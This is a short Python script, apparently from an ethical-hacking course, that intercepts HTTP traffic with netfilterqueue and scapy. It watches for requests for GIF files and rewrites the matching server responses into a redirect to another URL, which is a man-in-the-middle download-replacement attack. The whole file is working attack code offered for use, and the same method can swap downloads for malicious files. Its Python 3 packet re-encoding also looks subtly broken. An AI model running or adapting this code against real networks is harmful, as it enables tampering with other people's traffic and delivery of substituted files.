import netfilterqueue
import scapy.all as scapy


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # remove the len and chksum from the ip layer and the chksum from the TCP layer (scapy will calculate it automatically for us)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # if destination port == 80 (http port), it is a request
        if scapy_packet[scapy.TCP].dport == 80:
            # check for a ".x" file extension in the load field of the Raw layer
            if ".gif" in scapy_packet[scapy.Raw].load.decode():
                print("[+] gif Request")
                request_ack = scapy_packet[scapy.TCP].ack
                ack_list.append(request_ack)
        # if source port == 80 (http port), it is a response
        elif scapy_packet[scapy.TCP].sport == 80:
            # if the seq correspond to a ack stored in our list
            response_seq = scapy_packet[scapy.TCP].seq
            if response_seq in ack_list:
                ack_list.remove(response_seq)
                print("[+] Replacing file")
                modified_packet = set_load(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\nLocation: https://bestanimations.com/Site/funny-internet-animated-gif-42.gif",
                )

                # finally - modify the original packet
                packet.set_payload(str(modified_packet).encode())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
